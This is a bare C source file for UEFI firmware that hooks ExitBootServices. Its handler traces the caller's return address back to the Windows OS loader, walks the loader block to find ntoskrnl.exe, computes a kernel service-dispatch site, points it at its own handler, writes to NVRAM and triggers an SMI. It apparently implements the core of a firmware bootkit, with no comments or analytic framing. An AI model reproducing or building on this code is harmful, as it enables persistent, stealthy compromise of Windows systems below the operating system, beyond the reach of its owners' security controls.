#include "ei.h"
#include <intrin.h>

#define EI_APP 0
#define EI_FW  1

STATIC EFI_EXIT_BOOT_SERVICES prev;

STATIC EFI_STATUS EFIAPI ei_on_exit(EFI_HANDLE img, UINTN key)
{
	UINT64 ret, blk;
	ei_lb *lb;
	ei_ldr k;

	gBS->ExitBootServices = prev;
	ret = (UINT64)(UINTN)_ReturnAddress();
	ei.osldr = ei_mz(ret);
	if (!ei.osldr)
		return prev(img, key);

	blk = *(UINT64 *)(UINTN)(ei.osldr + EI_LDR_BLK);
	lb = (ei_lb *)(UINTN)blk;
	if (!lb)
		return prev(img, key);

	ei_world(EI_APP);
	k = ei_mod(&lb->load, L"ntoskrnl.exe");
	ei_world(EI_FW);

	ei.nt = (UINT64)(UINTN)k.base;
	ei.site = ei.nt + EI_NT_SVC;
	ei.isr = (UINT64)(UINTN)ei_svc;
	ei_nv_put();
	ei_smi();
	return prev(img, key);
}

VOID ei_hook_exit(VOID)
{
	prev = gBS->ExitBootServices;
	gBS->ExitBootServices = ei_on_exit;
}
